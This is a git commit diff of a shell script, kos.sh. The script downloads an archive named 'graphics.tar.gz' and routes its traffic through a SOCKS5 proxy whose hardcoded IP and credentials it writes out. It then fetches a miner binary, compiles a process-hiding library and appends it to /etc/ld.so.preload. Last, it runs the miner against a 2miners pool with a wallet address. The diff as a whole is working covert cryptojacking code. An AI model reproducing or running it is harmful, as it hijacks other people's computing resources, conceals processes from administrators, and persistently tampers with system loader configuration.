7761308f7d355351b347bb93dd2cf063cff60a05
koasdu <106860379+koasdu@users.noreply.github.com>
2022-06-06 11:29:09 +0000

    Update kos.sh

--- kos.sh
+++ kos.sh
@@ -1,12 +1,43 @@
 #!/bin/sh
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+sleep 2m
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./bezzHash --url=nano_3de5768bnrjiunbjhup1frf7ejk6asr4h961j6txg8qmiy36jehhxz89qca1.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=nano_3de5768bnrjiunbjhup1frf7ejk6asr4h961j6txg8qmiy36jehhxz89qca1.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
